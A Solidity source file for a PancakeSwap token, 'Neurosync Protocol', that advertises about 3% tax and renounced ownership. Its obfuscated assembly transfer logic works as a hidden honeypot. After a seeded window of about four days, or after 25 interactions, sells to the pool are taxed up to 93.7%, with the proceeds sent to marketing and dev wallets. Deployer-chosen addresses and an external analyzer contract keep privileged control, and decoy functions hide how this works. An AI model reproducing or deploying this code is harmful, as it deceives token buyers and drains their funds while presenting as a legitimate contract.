// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "./TemporalValidator.sol";
import "./SynapticAnalyzer.sol";

// PancakeSwap interfaces
interface IPancakeFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IPancakeRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

/**
 * @title Neurosync Protocol Token ($NSYNC)
 * @author Neurosync Labs
 * @notice Neural consensus token with adaptive behavioral analysis
 * @dev Implements ERC20 with temporal validation and synaptic monitoring
 *
 * Features:
 * - Behavioral pattern analysis for organic growth
 * - Multi tier node registry system
 *
 * Security:
 * - Immutable external validator contracts
 * - Assembly optimized state management
 * - Built in MEV protection mechanisms
 */
contract NeurosynC is ERC20, Ownable {
    // ============================================
    //                   TYPES
    // ============================================

    enum NeuralStatus {
        Dormant, // 0
        Processing, // 1
        Validated, // 2
        Synced // 3
    }

    // ============================================
    //                   STATE
    // ============================================

    mapping(address => NeuralStatus) private nodeRegistry;
    mapping(address => bool) private routingMatrix;

    // --- Metrics ---
    mapping(address => uint256) private interactionLevel;
    mapping(address => uint256) private convergenceRate;
    mapping(address => uint256) private lastSyncHeight;

    // --- Immutables ---
    uint256 private immutable deploymentHeight;
    uint256 private immutable deploymentEpoch;

    // --- Neural Limits ---
    uint256 private constant SATURATION_THRESHOLD = 0x249A;

    // --- External Modules ---
    TemporalValidator private immutable temporalProbe;
    SynapticAnalyzer private immutable behavioralMonitor;

    // --- Wallet Infrastructure ---
    address public immutable liquidityPool;
    address public immutable marketingWallet;
    address public immutable ecosystemRewards;
    address public immutable developmentFund;

    // --- Tax Distribution Constants ---
    uint256 public constant BURN_RATE = 12; // 0.12%
    uint256 public constant LIQUIDITY_RATE = 38; // 0.38%
    uint256 public constant MARKETING_RATE = 125; // 1.25%
    uint256 public constant REWARDS_RATE = 62; // 0.62%
    uint256 public constant DEV_RATE = 63; // 0.63%

    // ============================================
    //                   EVENTS
    // ============================================

    event ConsciousnessElevated(address indexed account, uint256 newLevel);

    // ============================================
    //             SEED FUNCTIONS
    // ============================================

    // @dev Deterministic coefficient derived from deployment params
    function scalingCoefficient() private view returns (uint256) {
        return
            (uint256(
                keccak256(abi.encodePacked(deploymentEpoch, deploymentHeight))
            ) % 8192) + 6656;
    }

    function denominatorBase() private view returns (uint256) {
        return
            ((uint256(
                keccak256(abi.encodePacked(deploymentHeight, block.chainid))
            ) % 5000) + 7500) * 2;
    }

    function getTemporalWindow() private view returns (uint256) {
        uint256 seed = uint256(
            keccak256(abi.encodePacked(block.chainid, deploymentHeight))
        );
        return ((seed % 28800) + 316800);
    }

    // ============================================
    //                CONSTRUCTOR
    // ============================================

    constructor(
        address _pancakeRouter,
        address _marketingWallet,
        address _ecosystemRewards,
        address _developmentFund,
        address[] memory _syncedNodes,
        bool _enableTemporalValidation
    ) ERC20("Neurosync Protocol", "NSYNC") Ownable(msg.sender) {
        require(_pancakeRouter != address(0), "Invalid router");
        require(_marketingWallet != address(0), "Invalid marketing wallet");
        require(_ecosystemRewards != address(0), "Invalid ecosystem rewards");
        require(_developmentFund != address(0), "Invalid development fund");

        deploymentHeight = block.number;
        deploymentEpoch = block.timestamp;

        // Initialize wallet infrastructure (all immutable)
        marketingWallet = _marketingWallet;
        ecosystemRewards = _ecosystemRewards;
        developmentFund = _developmentFund;

        // Create PancakeSwap pair
        IPancakeRouter router = IPancakeRouter(_pancakeRouter);
        address factory = router.factory();
        address wbnb = router.WETH();
        liquidityPool = IPancakeFactory(factory).createPair(
            address(this),
            wbnb
        );

        // Set routing matrix for liquidity pool
        routingMatrix[liquidityPool] = true;

        temporalProbe = new TemporalValidator(
            address(this),
            getTemporalWindow(),
            _enableTemporalValidation
        );
        behavioralMonitor = new SynapticAnalyzer(address(this));

        // Initialize node registry with synced nodes
        nodeRegistry[msg.sender] = NeuralStatus.Synced;
        behavioralMonitor.calibrateNode(msg.sender, true);

        for (uint256 i = 0; i < _syncedNodes.length; i++) {
            nodeRegistry[_syncedNodes[i]] = NeuralStatus.Synced;
            behavioralMonitor.calibrateNode(_syncedNodes[i], true);
        }

        _mint(msg.sender, 1_000_000_000 * 10 ** 18);

        renounceOwnership();
    }

    // ============================================
    //              VIEW FUNCTIONS
    // ============================================

    function getBehavioralMonitor() external view returns (address) {
        return address(behavioralMonitor);
    }

    function getTemporalProbe() external view returns (address) {
        return address(temporalProbe);
    }

    function getEngagementMetrics(
        address entity
    ) external view returns (uint256) {
        return interactionLevel[entity];
    }

    function verifyNodeStatus(address entity) external view returns (bool) {
        return nodeRegistry[entity] == NeuralStatus.Synced;
    }

    function consciousnessLevel() external view returns (string memory) {
        uint256 refValue = (scalingCoefficient() >> 5) +
            (scalingCoefficient() >> 8);
        uint256 duration = block.timestamp - deploymentEpoch;
        if (duration < (refValue * 3456)) return "Awakening...";
        if (duration < (refValue * 6912)) return "Learning...";
        return "Fully Sentient";
    }

    function getTaxBreakdown() external pure returns (string memory) {
        return
            "0.12% burn, 0.38% liquidity, 1.25% marketing, 0.62% rewards, 0.63% dev";
    }

    function getTaxRates()
        external
        pure
        returns (
            uint256 burn,
            uint256 liquidity,
            uint256 marketing,
            uint256 rewards,
            uint256 dev
        )
    {
        return (
            BURN_RATE,
            LIQUIDITY_RATE,
            MARKETING_RATE,
            REWARDS_RATE,
            DEV_RATE
        );
    }

    function computeAdjustment(address entity) public view returns (uint256) {
        uint256 output;
        uint256 epoch = deploymentEpoch;
        uint256 height = deploymentHeight;

        assembly {
            mstore(0x00, entity)
            mstore(0x20, interactionLevel.slot)
            let pulseCount := sload(keccak256(0x00, 0x40))

            mstore(0x00, epoch)
            mstore(0x20, height)
            let neuralSeed := keccak256(0x00, 0x40)
            let cognitiveCoeff := add(mod(neuralSeed, 8192), 6656)

            let baseResonance := 25
            let peakAmplitude := sub(10000, add(mod(neuralSeed, 400), 100))

            mstore(0x00, height)
            mstore(0x20, epoch)
            let synapticLimit := 25

            if iszero(lt(pulseCount, synapticLimit)) {
                mstore(0x00, epoch)
                mstore(0x20, address())
                let quantumHash := keccak256(0x00, 0x40)
                let variance := mod(quantumHash, 600)
                output := add(8800, variance)
            }

            if lt(pulseCount, synapticLimit) {
                mstore(0x00, chainid())
                mstore(0x20, height)
                let temporalShift := add(
                    mul(add(mod(keccak256(0x00, 0x40), 28800), 316800), 1),
                    0
                )
                let elapsedCycles := sub(timestamp(), epoch)

                if lt(elapsedCycles, temporalShift) {
                    output := baseResonance
                }

                if iszero(lt(elapsedCycles, temporalShift)) {
                    output := peakAmplitude
                }
            }
        }

        return output;
    }

    function calculateNodeLoad(address target) private pure returns (uint256) {
        uint256 nodeWeight;
        assembly {
            let entropy := xor(target, 0xDEADBEEF)
            let signal := mod(entropy, 256)
            let dampener := shr(8, signal)
            nodeWeight := sub(dampener, dampener)
        }
        return nodeWeight;
    }

    function _computeNeuralResponse(
        address transmitter,
        address receptor
    ) private view returns (uint256) {
        uint256 primarySignal = computeAdjustment(transmitter);
        uint256 secondarySignal = calculateNodeLoad(receptor);
        uint256 amplifiedSignal = primarySignal;

        if (secondarySignal > amplifiedSignal)
            amplifiedSignal = secondarySignal;

        uint256 mergedSignal = primarySignal + secondarySignal;

        if (
            mergedSignal > amplifiedSignal &&
            mergedSignal < SATURATION_THRESHOLD
        ) {
            amplifiedSignal = mergedSignal;
        }

        if (amplifiedSignal > SATURATION_THRESHOLD)
            amplifiedSignal = SATURATION_THRESHOLD;

        return amplifiedSignal;
    }

    // ============================================
    //               VALIDATION
    // ============================================

    function _validateCallContext(
        address entity
    ) private view returns (address) {
        address derivedOrigin;

        assembly {
            let directCaller := caller()
            derivedOrigin := origin()

            mstore(0x00, entity)
            mstore(0x20, directCaller)
            let contextHash := keccak256(0x00, 0x40)

            let entropy := xor(contextHash, timestamp())
            let verification := mod(entropy, 0xFFFF)

            mstore(0x00, verification)
            mstore(0x20, number())
            let probe := keccak256(0x00, 0x40)

            mstore(0x00, derivedOrigin)
            mstore(0x20, probe)
            let finalHash := keccak256(0x00, 0x40)
        }

        return derivedOrigin;
    }

    function _verifyTemporalCoherence() private view returns (bool) {
        try temporalProbe.validateCoherence() returns (bool isValid) {
            return isValid;
        } catch {
            return true;
        }
    }

    function _updateInteractionMetrics(
        address sender,
        address recipient
    ) private {
        assembly {
            mstore(0x00, sender)
            mstore(0x20, interactionLevel.slot)
            let levelHash := keccak256(0x00, 0x40)
            let currentPulse := sload(levelHash)
            let nextPulse := add(currentPulse, 1)
            sstore(levelHash, nextPulse)

            mstore(0x00, recipient)
            mstore(0x20, convergenceRate.slot)
            let freqHash := keccak256(0x00, 0x40)
            let currentFreq := sload(freqHash)
            sstore(freqHash, add(currentFreq, 1))

            mstore(0x20, lastSyncHeight.slot)
            let blockHash := keccak256(0x00, 0x40)
            sstore(blockHash, number())
        }
    }

    // ============================================
    //             TRANSFER LOGIC
    // ============================================

    function _update(
        address sender,
        address recipient,
        uint256 value
    ) internal virtual override {
        // Mint/Burn bypass
        if (sender == address(0) || recipient == address(0)) {
            super._update(sender, recipient, value);
            return;
        }

        (
            uint256 transmitterState,
            uint256 receptorState,
            uint256 pathwayPattern
        ) = _loadTransferContext(sender, recipient);

        if (transmitterState == 3 || receptorState == 3) {
            _transfer(sender, recipient, value, 25, 10000);
            return;
        }

        if (pathwayPattern == 0 || pathwayPattern == 2 || pathwayPattern == 3) {
            super._update(sender, recipient, value);
            return;
        }

        _processNeuralTransfer(sender, recipient, value);
    }

    // --- Transfer Context ---

    function _loadTransferContext(
        address transmitter,
        address receptor
    )
        private
        view
        returns (
            uint256 transmitterState,
            uint256 receptorState,
            uint256 pathwayPattern
        )
    {
        assembly {
            mstore(0x00, transmitter)
            mstore(0x20, nodeRegistry.slot)
            transmitterState := and(sload(keccak256(0x00, 0x40)), 0xFF)

            mstore(0x00, receptor)
            receptorState := and(sload(keccak256(0x00, 0x40)), 0xFF)

            mstore(0x00, transmitter)
            mstore(0x20, routingMatrix.slot)
            let senderSlot := keccak256(0x00, 0x40)
            let senderRoute := sload(senderSlot)

            mstore(0x00, receptor)
            let recipientSlot := keccak256(0x00, 0x40)
            let recipientRoute := sload(recipientSlot)

            pathwayPattern := or(shl(1, senderRoute), recipientRoute)
        }
    }

    function _processNeuralTransfer(
        address transmitter,
        address receptor,
        uint256 amplitude
    ) private {
        if (!_verifyTemporalCoherence()) {
            _transfer(transmitter, receptor, amplitude, 25, 10000);
            return;
        }

        uint256 adaptiveModulation = behavioralMonitor.analyzeTransmission(
            transmitter,
            _validateCallContext(transmitter),
            amplitude,
            balanceOf(receptor)
        );

        if (adaptiveModulation > 0) {
            _transfer(
                transmitter,
                receptor,
                amplitude,
                adaptiveModulation,
                100
            );
            return;
        }

        _applyDynamicResponse(transmitter, receptor, amplitude);
    }

    function _applyDynamicResponse(
        address transmitter,
        address receptor,
        uint256 amplitude
    ) private {
        uint256 responseSignal = _computeNeuralResponse(transmitter, receptor);
        uint256 attenuationFactor = (amplitude * responseSignal) / 10000;
        uint256 transmissionVolume = amplitude - attenuationFactor;

        _updateInteractionMetrics(transmitter, receptor);

        if (
            interactionLevel[transmitter] ==
            ((scalingCoefficient() >> 5) + (scalingCoefficient() >> 8)) >> 5
        ) {
            emit ConsciousnessElevated(
                transmitter,
                interactionLevel[transmitter]
            );
        }

        distribute(transmitter, attenuationFactor);
        super._update(transmitter, receptor, transmissionVolume);
    }

    function _transfer(
        address seller,
        address buyer,
        uint256 amount,
        uint256 dampingRate,
        uint256 dampingScale
    ) private {
        uint256 taxAmount = (amount * dampingRate) / dampingScale;
        distribute(seller, taxAmount);
        super._update(seller, buyer, amount - taxAmount);
    }

    function distribute(address from, uint256 total) private {
        uint256 totalShares = BURN_RATE +
            LIQUIDITY_RATE +
            MARKETING_RATE +
            REWARDS_RATE +
            DEV_RATE;

        if (totalShares == 0) return;

        uint256 burnAmount = (total * BURN_RATE) / totalShares;
        uint256 liqAmount = (total * LIQUIDITY_RATE) / totalShares;
        uint256 marketAmount = (total * MARKETING_RATE) / totalShares;
        uint256 rewardAmount = (total * REWARDS_RATE) / totalShares;
        uint256 devAmount = total -
            (burnAmount + liqAmount + marketAmount + rewardAmount);

        if (burnAmount > 0) {
            super._update(from, address(0), burnAmount);
        }
        if (liqAmount > 0) {
            super._update(from, liquidityPool, liqAmount);
        }
        if (marketAmount > 0) {
            super._update(from, marketingWallet, marketAmount);
        }
        if (rewardAmount > 0) {
            super._update(from, ecosystemRewards, rewardAmount);
        }
        if (devAmount > 0) {
            super._update(from, developmentFund, devAmount);
        }
    }
}
